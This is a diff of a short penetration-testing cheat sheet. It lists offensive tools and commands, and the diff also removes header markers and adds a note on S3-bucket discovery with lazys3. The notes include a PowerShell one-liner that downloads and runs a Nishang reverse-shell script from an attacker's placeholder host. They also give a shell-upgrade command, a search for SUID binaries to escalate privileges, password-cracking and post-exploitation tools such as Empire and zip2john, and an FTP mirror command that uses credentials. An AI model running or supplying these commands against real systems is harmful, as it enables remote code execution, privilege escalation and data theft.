@@ -1,7 +1,7 @@
 #### Tools & Techniques
 
 
-# Nishang
+ Nishang
 To get a sheel from an entry point where cmd is working or the entry point is a cmd
 
 cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 nishang.ps1
@@ -14,31 +14,31 @@ In cmd:
 powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nishang.ps1')"
 
 
-# Linux
+ Linux
 To get a better shell:
 python -c 'import pty;pty.spawn("/bin/bash");'
-# to list suid binary file:
+ to list suid binary file:
 find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
 
 
-# Windows
-# to convert in base64 with UTF-16LE encoding
+ Windows
+ to convert in base64 with UTF-16LE encoding
 echo -n "Hello World" | iconv --to-code UTF-16LE | base64 -w 0
 
-# Tools
-# Shell and Crack
+ Tools
+ Shell and Crack
 Unicorn.py :  https://github.com/trustedsec/unicorn  
 Empire.py  :  https://github.com/EmpireProject/Empire
 JAWS       :  https://github.com/411Hall/JAWS   (Windows Enumeration Tools)
 zip2john   :  https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c (To crack zipped password)
 
-# Steganography tools
+ Steganography tools
 zsteg,steghide,binwalk.strings,file,foremost
 
-# Other tools
+ Other tools
 readpst,mdb-shell,mdb-sql
 
-# Techniques
+ Techniques
 To download all files from ftp server:
 wget -m --no-passive ftp://username:password@x.x.x.x
 
@@ -48,3 +48,6 @@ link which can help:http://blog.viggy.in/?p=9
 Linux enumerarion help:  https://www.rebootuser.com/?p=1623#.V5QOe7grKUl
 
 
+To find S3 bucket of the program, I used nahamsec‘s lazys3.
+Command: ruby lazys3.rb site_name
+https://github.com/ehsahil/recon-my-way/tree/master/lazys3 
